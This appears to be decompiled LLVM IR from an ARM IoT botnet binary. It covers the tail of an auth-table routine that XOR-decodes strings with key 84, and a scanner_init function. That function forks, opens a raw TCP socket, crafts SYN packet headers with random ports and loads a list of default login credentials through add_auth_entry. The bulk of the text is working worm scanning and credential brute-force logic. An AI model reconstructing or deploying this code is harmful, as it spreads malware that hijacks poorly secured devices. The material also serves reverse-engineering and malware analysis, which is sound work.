  %v3_e40c = load i32, i32* @r4, align 4
  %v6_e40c = load i32, i32* @r5, align 4
  %v9_e40c = load i32, i32* @r6, align 4
  %v12_e40c = load i32, i32* @r7, align 4
  %v15_e40c = load i32, i32* @r8, align 4
  %v18_e40c = load i32, i32* @sb, align 4
  %v21_e40c = load i32, i32* @sl, align 4
  %v24_e40c = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_218d4.137 to i32), i32* @fp, align 4
  %v2_e414 = load i32, i32* @global_var_218d4.137, align 4
  store i32 ptrtoint (i32* @global_var_21900.139 to i32), i32* @sl, align 4
  %v1_e420 = add i32 %v2_e414, 1
  store i32 %v1_e420, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e42c = load i32, i32* @global_var_21900.139, align 4
  store i32 %v2_e42c, i32* %r0.global-to-local, align 4
  %v3_e430 = mul i32 %v1_e420, 16
  store i32 %v3_e430, i32* %r1.global-to-local, align 4
  %v4_e438 = inttoptr i32 %v2_e42c to i32*
  %v5_e438 = call i32 @realloc(i32* %v4_e438, i32 %v3_e430, i32 %arg3, i32 %v1_e420)
  %v2_e43c = load i32, i32* @global_var_218d4.137, align 4
  store i32 %v2_e43c, i32* %r2.global-to-local, align 4
  store i32 %v5_e438, i32* @r8, align 4
  %v0_e444 = load i32, i32* @r5, align 4
  store i32 %v0_e444, i32* %r0.global-to-local, align 4
  %v1_e44c = load i32, i32* @sl, align 4
  %v2_e44c = inttoptr i32 %v1_e44c to i32*
  store i32 %v5_e438, i32* %v2_e44c, align 4
  %v1_e450 = inttoptr i32 %v0_e444 to i8*
  %v2_e450 = call i32 @util_strlen(i8* %v1_e450)
  %sext = mul i32 %v2_e450, 16777216
  %v1_e454 = sdiv i32 %sext, 16777216
  %v2_e454 = add nsw i32 %v1_e454, 1
  store i32 %v2_e454, i32* @r4, align 4
  store i32 %v1_e454, i32* @r7, align 4
  store i32 %v2_e454, i32* %r0.global-to-local, align 4
  %v1_e460 = call i32 @malloc(i32 %v2_e454)
  store i32 %v1_e460, i32* %r0.global-to-local, align 4
  %v0_e464 = load i32, i32* @r5, align 4
  store i32 %v0_e464, i32* %r1.global-to-local, align 4
  %v0_e468 = load i32, i32* @r4, align 4
  store i32 %v0_e468, i32* %r2.global-to-local, align 4
  store i32 %v1_e460, i32* %r6.global-to-local, align 4
  %v3_e470 = call i32 @util_memcpy(i32 %v1_e460, i32 %v0_e464, i32 %v0_e468)
  store i32 %v3_e470, i32* %r0.global-to-local, align 4
  %v0_e474 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e474, 1
  %extract.t6 = trunc i32 %v0_e474 to i8
  br i1 %tmp22, label %dec_label_pc_e498, label %dec_label_pc_e47c

dec_label_pc_e47c:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e480

dec_label_pc_e480:                                ; preds = %dec_label_pc_e480, %dec_label_pc_e47c
  %v2_e488 = phi i32 [ %v1_e48c, %dec_label_pc_e480 ], [ 0, %dec_label_pc_e47c ]
  %v1_e480 = load i32, i32* %r6.global-to-local, align 4
  %v2_e480 = add i32 %v1_e480, %v2_e488
  %v3_e480 = inttoptr i32 %v2_e480 to i8*
  %v4_e480 = load i8, i8* %v3_e480, align 1
  %v6_e480 = zext i8 %v4_e480 to i32
  %v1_e484 = xor i32 %v6_e480, 84
  store i32 %v1_e484, i32* %r3.global-to-local, align 4
  %v1_e488 = trunc i32 %v1_e484 to i8
  store i8 %v1_e488, i8* %v3_e480, align 1
  %v0_e48c = load i32, i32* %r2.global-to-local, align 4
  %v1_e48c = add i32 %v0_e48c, 1
  store i32 %v1_e48c, i32* %r2.global-to-local, align 4
  %v1_e490 = load i32, i32* @r7, align 4
  %v9_e490 = icmp eq i32 %v1_e48c, %v1_e490
  br i1 %v9_e490, label %dec_label_pc_e498.loopexit, label %dec_label_pc_e480

dec_label_pc_e498.loopexit:                       ; preds = %dec_label_pc_e480
  %extract.t = trunc i32 %v1_e48c to i8
  br label %dec_label_pc_e498

dec_label_pc_e498:                                ; preds = %dec_label_pc_e498.loopexit, %entry
  %v0_e4a8.off0 = phi i8 [ %extract.t, %dec_label_pc_e498.loopexit ], [ %extract.t6, %entry ]
  %v2_e498 = load i32, i32* @global_var_218d4.137, align 4
  %v2_e49c = load i32, i32* @global_var_21900.139, align 4
  %v3_e4a0 = mul i32 %v2_e498, 16
  store i32 %v3_e4a0, i32* @sb, align 4
  %v2_e4a4 = add i32 %v2_e49c, %v3_e4a0
  store i32 %v2_e4a4, i32* %r2.global-to-local, align 4
  %v3_e4a8 = add i32 %v2_e4a4, 12
  %v4_e4a8 = inttoptr i32 %v3_e4a8 to i8*
  store i8 %v0_e4a8.off0, i8* %v4_e4a8, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e43c, i32* %r3.global-to-local, align 4
  %v0_e4b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_e4b4 = load i32, i32* @r8, align 4
  %v5_e4b4 = mul i32 %v2_e43c, 16
  %v6_e4b4 = add i32 %v1_e4b4, %v5_e4b4
  %v7_e4b4 = inttoptr i32 %v6_e4b4 to i32*
  store i32 %v0_e4b4, i32* %v7_e4b4, align 4
  %v2_e4b8 = load i32, i32* @global_var_21900.139, align 4
  store i32 %v2_e4b8, i32* @r7, align 4
  %v1_e4bc = inttoptr i32 %arg2 to i8*
  %v2_e4bc = call i32 @util_strlen(i8* %v1_e4bc)
  %sext1 = mul i32 %v2_e4bc, 16777216
  %v1_e4c0 = sdiv i32 %sext1, 16777216
  %v2_e4c0 = add nsw i32 %v1_e4c0, 1
  store i32 %v2_e4c0, i32* @r4, align 4
  store i32 %v1_e4c0, i32* @r6, align 4
  store i32 %v2_e4c0, i32* %r0.global-to-local, align 4
  %v1_e4cc = call i32 @malloc(i32 %v2_e4c0)
  store i32 %v1_e4cc, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e4d4 = load i32, i32* @r4, align 4
  store i32 %v0_e4d4, i32* %r2.global-to-local, align 4
  store i32 %v1_e4cc, i32* %r5.global-to-local, align 4
  %v3_e4dc = call i32 @util_memcpy(i32 %v1_e4cc, i32 %arg2, i32 %v0_e4d4)
  store i32 %v3_e4dc, i32* %r0.global-to-local, align 4
  %v0_e4e0 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e4e0, 1
  %extract.t8 = trunc i32 %v0_e4e0 to i8
  br i1 %tmp23, label %dec_label_pc_e504, label %dec_label_pc_e4e8

dec_label_pc_e4e8:                                ; preds = %dec_label_pc_e498
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e4ec, %dec_label_pc_e4e8
  %v2_e4f4 = phi i32 [ %v1_e4f8, %dec_label_pc_e4ec ], [ 0, %dec_label_pc_e4e8 ]
  %v1_e4ec = load i32, i32* %r5.global-to-local, align 4
  %v2_e4ec = add i32 %v1_e4ec, %v2_e4f4
  %v3_e4ec = inttoptr i32 %v2_e4ec to i8*
  %v4_e4ec = load i8, i8* %v3_e4ec, align 1
  %v6_e4ec = zext i8 %v4_e4ec to i32
  %v1_e4f0 = xor i32 %v6_e4ec, 84
  store i32 %v1_e4f0, i32* %r3.global-to-local, align 4
  %v1_e4f4 = trunc i32 %v1_e4f0 to i8
  store i8 %v1_e4f4, i8* %v3_e4ec, align 1
  %v0_e4f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4f8 = add i32 %v0_e4f8, 1
  store i32 %v1_e4f8, i32* %r2.global-to-local, align 4
  %v1_e4fc = load i32, i32* @r6, align 4
  %v9_e4fc = icmp eq i32 %v1_e4f8, %v1_e4fc
  br i1 %v9_e4fc, label %dec_label_pc_e504.loopexit, label %dec_label_pc_e4ec

dec_label_pc_e504.loopexit:                       ; preds = %dec_label_pc_e4ec
  %extract.t7 = trunc i32 %v1_e4f8 to i8
  br label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e504.loopexit, %dec_label_pc_e498
  %v0_e514.off0 = phi i8 [ %extract.t7, %dec_label_pc_e504.loopexit ], [ %extract.t8, %dec_label_pc_e498 ]
  %v2_e504 = load i32, i32* @global_var_218d4.137, align 4
  store i32 %v2_e504, i32* %r0.global-to-local, align 4
  %v2_e508 = load i32, i32* @global_var_21900.139, align 4
  %v3_e50c = mul i32 %v2_e504, 16
  store i32 %v3_e50c, i32* %r1.global-to-local, align 4
  %v2_e510 = or i32 %v3_e50c, 13
  %v3_e514 = add i32 %v2_e510, %v2_e508
  %v4_e514 = inttoptr i32 %v3_e514 to i8*
  store i8 %v0_e514.off0, i8* %v4_e514, align 1
  store i32 ptrtoint (i16** @global_var_21904.141 to i32), i32* %r4.global-to-local, align 4
  %v2_e520 = load i16, i16* bitcast (i16** @global_var_21904.141 to i16*), align 4
  %v3_e520 = zext i16 %v2_e520 to i32
  store i32 %v3_e520, i32* %lr.global-to-local, align 4
  %v2_e528 = load i32, i32* @global_var_21900.139, align 4
  store i32 %v2_e528, i32* %r2.global-to-local, align 4
  %v0_e530 = load i32, i32* %r1.global-to-local, align 4
  %v2_e530 = add i32 %v0_e530, %v2_e528
  store i32 %v2_e530, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21904.141 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e538 = load i32, i32* @sb, align 4
  %v1_e538 = load i32, i32* @r7, align 4
  %v2_e538 = add i32 %v1_e538, %v0_e538
  store i32 %v2_e538, i32* %ip.global-to-local, align 4
  %v0_e53c = load i32, i32* %r0.global-to-local, align 4
  %v1_e53c = add i32 %v0_e53c, 1
  store i32 %v1_e53c, i32* %r0.global-to-local, align 4
  %v3_e540 = add i32 %v2_e530, 10
  %v4_e540 = inttoptr i32 %v3_e540 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21904.141 to i32), i32 16), i32 16) to i16), i16* %v4_e540, align 2
  %v0_e544 = load i32, i32* %lr.global-to-local, align 4
  %v1_e544 = trunc i32 %v0_e544 to i16
  %v2_e544 = load i32, i32* %r1.global-to-local, align 4
  %v3_e544 = add i32 %v2_e544, 8
  %v4_e544 = inttoptr i32 %v3_e544 to i16*
  store i16 %v1_e544, i16* %v4_e544, align 2
  %v0_e548 = load i32, i32* %r5.global-to-local, align 4
  %v1_e548 = load i32, i32* %ip.global-to-local, align 4
  %v2_e548 = add i32 %v1_e548, 4
  %v3_e548 = inttoptr i32 %v2_e548 to i32*
  store i32 %v0_e548, i32* %v3_e548, align 4
  %v1_e54c = load i32, i32* @fp, align 4
  %v2_e54c = inttoptr i32 %v1_e54c to i32*
  store i32 %v1_e53c, i32* %v2_e54c, align 4
  %v0_e550 = load i32, i32* %r3.global-to-local, align 4
  %v1_e550 = trunc i32 %v0_e550 to i16
  %v2_e550 = load i32, i32* %r4.global-to-local, align 4
  %v3_e550 = inttoptr i32 %v2_e550 to i16*
  store i16 %v1_e550, i16* %v3_e550, align 2
  store i32 %v3_e40c, i32* @r4, align 4
  store i32 %v6_e40c, i32* @r5, align 4
  store i32 %v9_e40c, i32* @r6, align 4
  store i32 %v12_e40c, i32* @r7, align 4
  store i32 %v15_e40c, i32* @r8, align 4
  store i32 %v18_e40c, i32* @sb, align 4
  store i32 %v21_e40c, i32* @sl, align 4
  store i32 %v24_e40c, i32* @fp, align 4
  ret i32 %v1_e53c

; uselistorder directives
  uselistorder i32 %v3_e50c, { 1, 0 }
  uselistorder i32 %v1_e4f8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e4cc, { 1, 0, 2 }
  uselistorder i32 %v3_e4a0, { 1, 0 }
  uselistorder i32 %v1_e48c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e460, { 1, 0, 2 }
  uselistorder i32 %v2_e43c, { 1, 0, 2 }
  uselistorder i32 %v3_e430, { 1, 0 }
  uselistorder i32 %v1_e420, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 10, 9, 11, 12, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 23, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v6_e56c = load i32, i32* @r5, align 4
  %v18_e56c = load i32, i32* @sb, align 4
  %v0_e578 = call i32 @__libc_fork()
  store i32 %v0_e578, i32* %r0.global-to-local, align 4
  %v7_e57c = icmp eq i32 %v0_e578, -1
  %. = zext i1 %v7_e57c to i32
  %tmp369 = icmp slt i32 %v0_e578, 1
  %storemerge329 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_243f4.143 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e598 = icmp eq i32 %storemerge329, 0
  store i1 %v2_e598, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e578, i32* @global_var_243f4.143, align 4
  br i1 %v2_e598, label %dec_label_pc_e5b4, label %dec_label_pc_e5a4

dec_label_pc_e5a4:                                ; preds = %entry
  store i32 %v6_e56c, i32* @r5, align 4
  store i32 %v18_e56c, i32* @sb, align 4
  ret i32 %v0_e578

dec_label_pc_e5b4:                                ; preds = %entry
  %v0_e5b4 = call i32 @util_local_addr()
  store i32 %v0_e5b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243d0.55 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e5b4, i32* @global_var_243d0.55, align 4
  %v1_e5c0 = call i32 @rand_init(i32 %v0_e5b4)
  %v0_e5c4 = load i32, i32* @r4, align 4
  store i32 %v0_e5c4, i32* %r0.global-to-local, align 4
  %v1_e5c8 = inttoptr i32 %v0_e5c4 to i32*
  %v2_e5c8 = call i32 @__GI_time(i32* %v1_e5c8)
  store i32 ptrtoint (i32* @global_var_21908.135 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e5c8, i32* @global_var_21908.135, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e5dc = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_243ec.147 to i32), i32* %r3.global-to-local, align 4
  %v0_e5e4 = load i32, i32* @r4, align 4
  store i32 %v0_e5e4, i32* %stack_var_-52, align 4
  store i32 %v2_e5dc, i32* @global_var_243ec.147, align 4
  store i32 %v0_e5e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e5f0

dec_label_pc_e5f0:                                ; preds = %dec_label_pc_e5f0.dec_label_pc_e5f0_crit_edge, %dec_label_pc_e5b4
  %v2_e5fc = phi i32 [ %v2_e5fc.pre, %dec_label_pc_e5f0.dec_label_pc_e5f0_crit_edge ], [ %v2_e5dc, %dec_label_pc_e5b4 ]
  %v0_e604 = phi i32 [ %v0_e634, %dec_label_pc_e5f0.dec_label_pc_e5f0_crit_edge ], [ %v0_e5e4, %dec_label_pc_e5b4 ]
  %v3_e5f8 = mul i32 %v0_e604, 256
  store i32 %v3_e5f8, i32* %ip.global-to-local, align 4
  store i32 %v2_e5fc, i32* @lr, align 4
  %v2_e60c = mul i32 %v0_e604, 288
  %v1_e614 = add i32 %v0_e604, 1
  store i32 %v1_e614, i32* %r0.global-to-local, align 4
  %v2_e618 = add i32 %v2_e60c, %v2_e5fc
  store i32 %v2_e618, i32* %r2.global-to-local, align 4
  store i32 %v2_e618, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e62c = add i32 %v2_e618, 4
  %v3_e62c = inttoptr i32 %v2_e62c to i32*
  store i32 -1, i32* %v3_e62c, align 4
  %v0_e630 = load i32, i32* @r5, align 4
  %v1_e630 = load i32, i32* %r1.global-to-local, align 4
  %v2_e630 = add i32 %v1_e630, 12
  %v3_e630 = inttoptr i32 %v2_e630 to i32*
  store i32 %v0_e630, i32* %v3_e630, align 4
  %v0_e634 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e634, i32* %stack_var_-52, align 4
  %v7_e638 = icmp sgt i32 %v1_e614, 255
  br i1 %v7_e638, label %dec_label_pc_e63c, label %dec_label_pc_e5f0.dec_label_pc_e5f0_crit_edge

dec_label_pc_e5f0.dec_label_pc_e5f0_crit_edge:    ; preds = %dec_label_pc_e5f0
  %v2_e5fc.pre = load i32, i32* @global_var_243ec.147, align 4
  br label %dec_label_pc_e5f0

dec_label_pc_e63c:                                ; preds = %dec_label_pc_e5f0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_e648 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_e648, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243f0.149 to i32), i32* %r2.global-to-local, align 4
  %v2_e650 = icmp eq i32 %v3_e648, -1
  store i1 %v2_e650, i1* %cpsr_c.global-to-local, align 1
  %v7_e650 = icmp eq i32 %v3_e648, -1
  store i1 %v7_e650, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e648, i32* @r4, align 4
  store i32 %v3_e648, i32* @global_var_243f0.149, align 4
  br i1 %v7_e650, label %dec_label_pc_e63c.dec_label_pc_fc10_crit_edge, label %dec_label_pc_e660

dec_label_pc_e63c.dec_label_pc_fc10_crit_edge:    ; preds = %dec_label_pc_e63c
  %.pre283 = ptrtoint i8* %stack_var_-56 to i32
  br label %dec_label_pc_fc10

dec_label_pc_e660:                                ; preds = %dec_label_pc_e63c
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e664 = load i32, i32* @r5, align 4
  store i32 %v0_e664, i32* @r2, align 4
  %v2_e668 = call i32 @__libc_fcntl(i32 %v3_e648, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e670 = or i32 %v2_e668, 2048
  store i32 %v1_e670, i32* @r2, align 4
  %v0_e674 = load i32, i32* @r4, align 4
  store i32 %v0_e674, i32* %r0.global-to-local, align 4
  %v2_e678 = call i32 @__libc_fcntl(i32 %v0_e674, i32 4)
  %v2_e680 = load i32, i32* @global_var_243f0.149, align 4
  store i32 %v2_e680, i32* %r0.global-to-local, align 4
  %v2_e684 = ptrtoint i8* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e68c = load i32, i32* @r5, align 4
  store i32 %v0_e68c, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e694 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e694, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e6a4 = call i32 @__GI_setsockopt(i32 %v2_e680, i32 %v0_e68c, i32 3, i32 %v2_e694, i32 4)
  store i32 %v5_e6a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e6a8 = icmp eq i32 %v5_e6a4, 0
  store i1 %v2_e6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e6a8, label %dec_label_pc_e6b0, label %dec_label_pc_fc04

dec_label_pc_e6b0:                                ; preds = %dec_label_pc_e660, %dec_label_pc_e6b0
  %v0_e6b0 = call i32 @rand_next()
  %v3_e6b4 = mul i32 %v0_e6b0, 65536
  store i32 %v3_e6b4, i32* %r0.global-to-local, align 4
  %v1_e6bc = mul i32 %v0_e6b0, 256
  %v3_e6c0 = and i32 %v1_e6bc, 65280
  %tmp372 = udiv i32 %v0_e6b0, 256
  %v4_e6c4 = urem i32 %tmp372, 256
  %v5_e6c4 = or i32 %v4_e6c4, %v3_e6c0
  store i32 %v5_e6c4, i32* %r3.global-to-local, align 4
  %v2_e6c8 = icmp ugt i32 %v5_e6c4, 1023
  store i1 %v2_e6c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e6c8 = icmp eq i32 %v5_e6c4, 1024
  store i1 %v7_e6c8, i1* %cpsr_z.global-to-local, align 1
  %v3_e6d0 = icmp ult i32 %v5_e6c4, 1022
  br i1 %v3_e6d0, label %dec_label_pc_e6b0, label %dec_label_pc_e6d4

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e6b0
  %v5_e6cc.le = trunc i32 %v0_e6b0 to i16
  store i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32* %r0.global-to-local, align 4
  %v2_e6d8 = load i8, i8* bitcast (i8** @global_var_218d8.151 to i8*), align 4
  %v3_e6d8 = zext i8 %v2_e6d8 to i32
  %v1_e6dc = and i32 %v3_e6d8, 240
  %v1_e6e0 = or i32 %v1_e6dc, 5
  store i32 %v1_e6e0, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_218d8.151 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_218da.152 to i16*), align 4
  %v0_e700 = call i32 @rand_next()
  %v1_e700 = trunc i32 %v0_e700 to i16
  %v3_e708 = load i8, i8* @global_var_218f8.155, align 1
  store i32 ptrtoint (i16* @global_var_218ec.154 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32* %ip.global-to-local, align 4
  %v1_e718 = urem i8 %v3_e708, 16
  store i16 %v1_e700, i16* bitcast (i32* @global_var_218dc.156 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_e728 = or i8 %v1_e718, 80
  store i8 64, i8* bitcast (i32* @global_var_218e0.157 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_218e1.158 to i8*), align 4
  store i8 %v1_e728, i8* @global_var_218f8.155, align 1
  %v4_e738 = sext i16 %v5_e6cc.le to i32
  store i32 %v4_e738, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_218ee.159, align 2
  store i16 %v5_e6cc.le, i16* @global_var_218ec.154, align 2
  %v0_e748 = call i32 @rand_next()
  %v1_e748 = trunc i32 %v0_e748 to i16
  %v3_e750 = load i8, i8* @global_var_218f9.160, align 1
  %v4_e750 = zext i8 %v3_e750 to i32
  store i32 ptrtoint (i16* @global_var_218ec.154 to i32), i32* %ip.global-to-local, align 4
  %v1_e758 = or i32 %v4_e750, 2
  store i32 %v1_e758, i32* %r3.global-to-local, align 4
  store i16 %v1_e748, i16* bitcast (i32* @global_var_218fa.161 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_18fec.163 to i32), i32* %r1.global-to-local, align 4
  %v1_e764 = trunc i32 %v1_e758 to i8
  store i8 %v1_e764, i8* @global_var_218f9.160, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e770 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32 ptrtoint (i32* @global_var_18fec.163 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18ff0.167 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e780 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32 ptrtoint ([5 x i8]* @global_var_18ff0.167 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18ff8.169 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e790 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32 ptrtoint ([9 x i8]* @global_var_18ff8.169 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_19004.171 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_19004.171 to i32), i32* %r1.global-to-local, align 4
  %v5_e7a0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_19004.171 to i32), i32 ptrtoint ([7 x i8]* @global_var_19004.171 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18fec.163 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e7b0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), i32 ptrtoint (i32* @global_var_18fec.163 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19014.175 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32 ptrtoint ([9 x i8]* @global_var_19014.175 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_19020.177 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19020.177 to i32), i32* %r1.global-to-local, align 4
  %v5_e7d0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19020.177 to i32), i32 ptrtoint ([6 x i8]* @global_var_19020.177 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19028.179 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e7e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32 ptrtoint ([6 x i8]* @global_var_19028.179 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_19030.181 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19030.181 to i32), i32* %r1.global-to-local, align 4
  %v5_e7f0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19030.181 to i32), i32 ptrtoint ([8 x i8]* @global_var_19030.181 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e800 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19038.183 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_e810 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32 ptrtoint (i32* @global_var_19038.183 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19048.185 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e820 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fe8.165 to i32), i32 ptrtoint ([6 x i8]* @global_var_19048.185 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_19050.187 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19050.187 to i32), i32* %r1.global-to-local, align 4
